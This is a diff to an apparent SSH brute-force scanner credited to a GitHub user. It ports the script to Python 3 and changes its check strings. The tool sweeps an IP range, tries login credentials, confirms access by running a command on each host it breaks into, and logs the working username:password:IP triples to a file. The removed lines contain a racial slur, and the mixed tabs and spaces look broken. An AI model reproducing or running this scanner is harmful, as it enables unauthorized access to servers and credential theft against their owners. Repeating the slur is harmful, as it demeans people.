@@ -12,8 +12,7 @@ import os
 
 
 if len(sys.argv) < 3:
-    print \
-"""
+    print ("""
 
 XXXXXXXXXXXXXXXXXXFEDERAL RESERVE NOTEXXXXXXXXXXXXXXXXXXX
 XXX  XX       THE UNITED STATES OF AMERICA        XXX  XX
@@ -36,8 +35,8 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
              [+] github.com/Souhardya [+]
 
 
-"""
-    print "Usage: python "+sys.argv[0]+" [Start IP] [End IP] [etherum/misc]"
+""")
+    print("Usage: python "+sys.argv[0]+" [Start IP] [End IP] [etherum/misc]")
     
 
 if not os.geteuid()==0:
@@ -111,21 +110,22 @@ class sshscanner(threading.Thread): # TAG: 1A
                 badserver=True
                 stdin, stdout, stderr = ssh.exec_command("echo hellonofucksgiven")
                 output = stdout.read()
-                if "nigger" in output:
-                    badserver=False 
-                if badserver == False:
+                if "hellonofucksgiven" in output:
                     os.system("echo -e " +self.ip+ " >> .stats.ips")
                     os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> gathered.log")
-                    print "\033[32mGathering -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m"
-                    ssh.exec_command("echo niggered")
-                    time.sleep(3)
-                    ssh.close()
-                if badserver == True:
-                    ssh.close()
+                    print("\033[32mGathering -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m")
+                    ssh.exec_command("echo hellothere:)")
+                else:
+		    pass
+	
+	        time.sleep(3)
+                ssh.close()
             except:
                 pass
             x = 0
+		
 ip_range = ipRange("" +sys.argv[1], "" +sys.argv[2])
+
 for ip in ip_range:
     try:                
         t = sshscanner(ip)
